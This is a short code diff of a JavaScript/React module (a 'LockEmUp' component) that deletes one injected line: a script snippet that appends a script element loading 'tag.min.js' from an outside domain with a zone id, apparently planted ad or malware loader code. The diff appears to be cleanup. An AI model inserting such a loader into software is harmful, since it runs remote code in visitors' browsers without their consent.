@@ -77,7 +77,7 @@ const fmt = (t) => {
   const m = Math.floor(t / 60), s = Math.floor(t % 60)
   return m + ':' + String(s).padStart(2, '0')
 }
-<script>(function(s){s.dataset.zone='12194696',s.src='https://nap5k.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
+
 export default function LockEmUp() {
   const router = useRouter()
   const root = useRef(null)
